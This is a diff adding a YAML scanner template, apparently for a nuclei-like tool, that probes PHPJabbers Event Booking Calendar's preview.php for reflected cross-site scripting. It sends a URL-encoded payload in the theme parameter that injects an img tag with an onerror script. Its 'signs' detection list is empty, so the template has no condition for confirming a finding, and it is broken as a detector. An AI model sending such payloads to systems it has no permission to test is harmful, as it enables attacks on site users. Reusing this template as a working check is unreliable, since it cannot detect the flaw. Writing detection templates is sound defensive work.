@@ -1,0 +1,16 @@
+id: phpjabbers-event-booking-xss
+brief:
+    title: PHPJabbers Event Booking Calendar - Reflected XSS
+    by: 0x_Akoko
+    level: medium
+    about: Detected that PHPJabbers Event Booking Calendar contained a reflected cross-site scripting vulnerability in the preview.php endpoint
+    label:
+        - phpjabbers
+        - xss
+        - reflected
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/scripts/event-booking-calendar/preview.php?locale=1&hide=0&theme=theme1%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3Etest'
+        - '{{BaseURL}}/preview.php?locale=1&hide=0&theme=theme1%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3Etest'
+      signs: []
